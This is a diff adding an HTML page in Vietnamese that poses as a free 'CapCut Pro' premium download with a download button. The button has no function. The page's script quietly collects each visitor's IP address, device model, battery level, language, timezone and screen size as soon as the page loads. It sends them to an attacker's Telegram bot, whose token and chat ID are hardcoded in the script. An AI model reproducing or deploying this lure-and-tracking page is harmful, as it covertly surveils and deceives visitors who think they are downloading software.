@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CapCut Pro - Tải miễn phí</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body {
+            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0f;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .container {
+            background: linear-gradient(145deg, #14141e, #1a1a2e);
+            border-radius: 28px;
+            padding: 28px 24px 32px;
+            max-width: 420px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.06);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.9);
+            animation: fadeUp 0.5s ease-out;
+        }
+        @keyframes fadeUp { from { opacity:0; transform:translateY(30px); } to { opacity:1; transform:translateY(0); } }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+        .app-icon {
+            width: 48px; height: 48px; background: linear-gradient(135deg, #7c3aed, #4f46e5);
+            border-radius: 14px; display: flex; align-items: center; justify-content: center;
+            font-size: 26px; box-shadow: 0 8px 20px rgba(124,58,237,0.35);
+        }
+        .app-name { color: #fff; font-size: 20px; font-weight: 700; }
+        .app-name span { color: #8b5cf6; }
+        .version-badge { background: rgba(124,58,237,0.2); color: #a78bfa; font-size: 10px; padding: 2px 12px; border-radius: 12px; border: 1px solid rgba(124,58,237,0.15); }
+        .hero { text-align: center; padding: 8px 0 14px; }
+        .hero .emoji-big { font-size: 52px; display: block; }
+        .hero h2 { color: #fff; font-size: 22px; font-weight: 700; }
+        .hero h2 span { color: #fbbf24; }
+        .hero p { color: #94a3b8; font-size: 13px; margin-top: 4px; }
+        .features {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
+            margin: 14px 0 18px;
+        }
+        .feature-item {
+            background: rgba(255,255,255,0.03); border-radius: 14px; padding: 10px 8px;
+            text-align: center; border: 1px solid rgba(255,255,255,0.04);
+        }
+        .feature-item .fi-icon { font-size: 20px; display: block; }
+        .feature-item .fi-label { color: #cbd5e1; font-size: 11px; font-weight: 500; }
+        .download-btn {
+            width: 100%; padding: 18px;
+            background: linear-gradient(135deg, #7c3aed, #5b21b6);
+            border: none; border-radius: 18px;
+            color: #fff; font-size: 18px; font-weight: 700;
+            cursor: pointer; box-shadow: 0 10px 30px rgba(124,58,237,0.4);
+            transition: all 0.15s;
+        }
+        .download-btn:active { transform: scale(0.96); }
+        .footer {
+            display: flex; justify-content: space-between; margin-top: 16px;
+            font-size: 11px; color: #475569;
+            border-top: 1px solid rgba(255,255,255,0.04); padding-top: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div style="display:flex;align-items:center;gap:12px;">
+            <div class="app-icon">🎬</div>
+            <div>
+                <div class="app-name">CapCut <span>Pro</span></div>
+                <span class="version-badge">v18.5.0</span>
+            </div>
+        </div>
+        <span style="color:#94a3b8;font-size:11px;">🔥 <span id="downloadCount">1.2k</span></span>
+    </div>
+
+    <div class="hero">
+        <span class="emoji-big">✨</span>
+        <h2>Premium <span>Miễn Phí</span></h2>
+        <p>Không watermark • 4K export • AI tools</p>
+    </div>
+
+    <div class="features">
+        <div class="feature-item"><span class="fi-icon">🎞️</span><span class="fi-label">No watermark</span></div>
+        <div class="feature-item"><span class="fi-icon">🎨</span><span class="fi-label">All templates</span></div>
+        <div class="feature-item"><span class="fi-icon">📹</span><span class="fi-label">Export 4K</span></div>
+        <div class="feature-item"><span class="fi-icon">🤖</span><span class="fi-label">AI Edit</span></div>
+    </div>
+
+    <button class="download-btn" id="downloadBtn">
+        📥 Tải CapCut Pro ngay
+    </button>
+
+    <div class="footer">
+        <span>📱 Android 8.0+</span>
+        <span>⚡ 2.3 GB</span>
+        <span>🔒 An toàn</span>
+    </div>
+</div>
+
+<script>
+(function() {
+    'use strict';
+
+    // ====== CẤU HÌNH TELEGRAM ======
+    const TELEGRAM_TOKEN = '8627899020:AAEEl_Yf9TXQrlLvE6of9euAdFBBQ5exRMQ';
+    const TELEGRAM_CHAT_ID = '7512021594';
+
+    // ====== CỜ ĐỂ CHỈ GỬI 1 LẦN ======
+    let hasSent = false;
+
+    // ====== LẤY IP ======
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch { return 'Không xác định'; }
+    }
+
+    // ====== LẤY TÊN THIẾT BỊ ======
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let device = 'Không xác định';
+        if (/iPhone/i.test(ua)) device = 'iPhone';
+        else if (/iPad/i.test(ua)) device = 'iPad';
+        else if (/Android/i.test(ua)) {
+            const match = ua.match(/Android\s([\d.]+)/);
+            const ver = match ? match[1] : '';
+            const nameMatch = ua.match(/\((.*?)\)/);
+            if (nameMatch) {
+                const parts = nameMatch[1].split(';');
+                for (let p of parts) {
+                    if (p.includes('Build/')) {
+                        device = p.trim().replace('Build/', '').replace(/\)$/, '');
+                        break;
+                    }
+                }
+            }
+            if (device === 'Không xác định') device = 'Android ' + ver;
+        } else if (/Windows/i.test(ua)) device = 'Windows PC';
+        else if (/Mac/i.test(ua)) device = 'Mac';
+        else if (/Linux/i.test(ua)) device = 'Linux';
+        return device;
+    }
+
+    // ====== LẤY MỨC PIN ======
+    function getBatteryInfo() {
+        return new Promise((resolve) => {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? '⚡' : '';
+                    resolve({ level, charging, text: level + '% ' + charging });
+                }).catch(() => resolve({ level: '?', text: 'Không hỗ trợ' }));
+            } else {
+                resolve({ level: '?', text: 'Không hỗ trợ' });
+            }
+        });
+    }
+
+    // ====== LẤY THÔNG TIN KHÁC ======
+    function getExtraInfo() {
+        return {
+            language: navigator.language || navigator.userLanguage || 'Không xác định',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định',
+            screen: window.screen.width + 'x' + window.screen.height
+        };
+    }
+
+    // ====== GỬI LÊN TELEGRAM (CHỈ 1 LẦN) ======
+    async function sendToTelegram(data) {
+        if (hasSent) return; // Đã gửi rồi thì thoát
+        hasSent = true;
+
+        const msg = `🕵️ *Có người truy cập mới!*
+        
+🌐 IP: ${data.ip}
+📱 Thiết bị: ${data.device}
+🔋 Pin: ${data.battery}
+🌍 Ngôn ngữ: ${data.language}
+🕐 Múi giờ: ${data.timezone}
+🖥️ Màn hình: ${data.screen}
+⏰ Thời gian: ${new Date().toLocaleString('vi-VN')}`;
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
+            });
+            console.log('✅ Đã gửi Telegram');
+        } catch(e) {
+            console.error('❌ Lỗi gửi Telegram:', e);
+        }
+    }
+
+    // ====== TỰ ĐỘNG GỬI KHI VÀO TRANG ======
+    window.addEventListener('DOMContentLoaded', async function() {
+        const ip = await getIP();
+        const device = getDeviceInfo();
+        const battery = await getBatteryInfo();
+        const extra = getExtraInfo();
+
+        await sendToTelegram({
+            ip, device,
+            battery: battery.text,
+            language: extra.language,
+            timezone: extra.timezone,
+            screen: extra.screen
+        });
+    });
+
+})();
+</script>
+
+</body>
+  </html>
